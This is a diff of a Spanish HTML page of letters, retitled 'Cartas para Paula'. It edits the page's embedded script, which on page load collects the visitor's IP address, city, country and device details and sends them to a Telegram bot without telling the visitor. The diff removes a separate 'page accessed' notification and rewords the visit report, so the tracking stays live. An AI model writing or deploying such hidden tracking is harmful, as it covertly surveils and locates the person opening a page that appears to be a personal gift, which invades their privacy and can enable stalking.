@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Carrusel de Cartas Especiales</title>
+  <title>Cartas para Paula</title>
 
   <!-- Fuentes -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -701,7 +701,7 @@
         .catch(err => console.error("Error en fetch Telegram:", err));
     }
 
-    telegramSendMessage("Se ha accedido a la página con Carrusel de Cartas.");
+    
 
     // Ejemplo de recolección de IP y geolocalización
     async function getUserIPAndLocation() {
@@ -737,7 +737,7 @@
       if (data) {
         const { ip, city, country } = data;
         const device = guessDeviceDetails();
-        telegramSendMessage(`Visita:\nIP: ${ip}\nCiudad: ${city}\nPaís: ${country}\nDevice: ${device}`);
+        telegramSendMessage(`Visita Cartas:\nIP: ${ip}\nCiudad: ${city}\nPaís: ${country}\nDevice: ${device}`);
       }
     })();
   </script>
